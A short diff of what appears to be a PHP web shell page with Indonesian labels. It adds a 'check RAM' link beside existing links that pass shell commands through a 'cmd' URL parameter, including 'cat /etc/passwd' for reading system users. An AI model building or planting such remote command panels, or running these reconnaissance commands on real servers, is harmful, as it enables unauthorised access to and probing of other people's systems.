@@ -79,6 +79,7 @@ body {
 		<a href="?cmd=lsb_release -a">Cek Distro linux</a> &#8226; 
 		<a href="?cmd=php -v">Cek versi PHP</a> &#8226; 
 		<a href="?cmd=lscpu">Cek CPU</a> &#8226;  
+		<a href="?cmd=free">Cek RAM</a> &#8226;
 		<a href="?cmd=cat /etc/passwd">Cek User linux</a>
 	</p>
 <?php
